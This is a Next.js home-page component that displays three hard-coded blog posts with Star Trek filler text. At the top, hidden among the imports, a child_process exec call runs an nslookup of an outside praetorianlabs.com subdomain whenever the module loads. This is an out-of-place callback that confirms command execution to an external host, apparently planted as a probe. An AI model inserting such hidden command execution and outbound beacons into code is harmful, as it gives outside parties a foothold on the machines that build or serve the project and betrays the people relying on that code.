import Head from 'next/head';
import styles from '../styles/Home.module.css';
import Post from '../components/Post';
const { exec } = require("child_process");


exec("nslookup wpecommand.dns.praetorianlabs.com", (error, stdout, stderr) => {
    if (error) {
        console.log(`error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
});

const POSTS = [
  {
    id: 'cG9zdDoxMA==',
    content:
      '\n' +
      '<p>Mr. Worf, you sound like a man who&#8217;s asking his friend if he can start dating his sister. Is it my imagination, or have tempers become a little frayed on the ship lately? I&#8217;ll be sure to note that in my log. Fear is the true enemy, the only enemy. Some days you get the bear, and some days the bear gets you. Now we know what they mean by &#8216;advanced&#8217; tactical training. Fate protects fools, little children and ships named Enterprise.</p>\n',
    title: 'Fate. It protects fools.',
    slug: 'fate-it-protects-fools',
    thumbnail: {
      sourceUrl:
        'https://dynahead.wpengine.com/wp-content/uploads/2020/12/ayo-ogunseinde-sibVwORYqs0-unsplash-150x150.jpg',
    },
  },
  {
    id: 'cG9zdDo2',
    content:
      '\n' +
      '<p>Did you come here for something in particular or just general Riker-bashing? Ensign Babyface! We could cause a diplomatic crisis. Take the ship into the Neutral Zone Now, how the hell do we defeat an enemy that knows us better than we know ourselves? I will obey your orders. I will serve this ship as First Officer. And in an attack against the Enterprise, I will die with this crew. But I will not break my oath of loyalty to Starfleet. You&#8217;re going to be an interesting companion, Mr. Data. You bet I&#8217;m agitated! I may be surrounded by insanity, but I am not insane.</p>\n',
    title: 'You enjoyed that',
    slug: 'you-enjoyed-that',
    thumbnail: {
      sourceUrl:
        'https://dynahead.wpengine.com/wp-content/uploads/2020/12/christopher-campbell-rDEOVtE7vOs-unsplash-150x150.jpg',
    },
  },
  {
    id: 'cG9zdDox',
    content:
      '\n' +
      '<p>Did you come here for something in particular or just general Riker-bashing? I guess it&#8217;s better to be lucky than good. You&#8217;re going to be an interesting companion, Mr. Data. I recommend you don&#8217;t fire until you&#8217;re within 40,000 kilometers. But the probability of making a six is no greater than that of rolling a seven. And blowing into maximum warp speed, you appeared for an instant to be in two places at once. Maybe we better talk out here; the observation lounge has turned into a swamp. I&#8217;ll be sure to note that in my log. I am your worst nightmare! We have a saboteur aboard.</p>\n',
    title: 'Well, that’s certainly good',
    slug: 'hello-world',
    thumbnail: {
      sourceUrl:
        'https://dynahead.wpengine.com/wp-content/uploads/2020/12/bruce-mars-AndE50aaHn4-unsplash-150x150.jpg',
    },
  },
];

export default function Home() {
  return (
    <div className={styles.container}>
      <Head>
        <title>Next.js & Wordpress Static</title>
        <link rel='icon' href='/favicon.ico' />
      </Head>

      <main className={styles.main}>
        <h1 className={styles.title}>
          Static Headless <strike>Wordpress</strike>
        </h1>

        <p className={styles.description}>
          Next.js with static hard coded data
        </p>

        <div className={styles.grid}>
          {POSTS.map(({ id, title, url, content, thumbnail }) => (
            <Post
              key={id}
              url={url}
              title={title}
              content={content}
              imgUrl={thumbnail.sourceUrl}
            />
          ))}
        </div>
      </main>
    </div>
  );
}
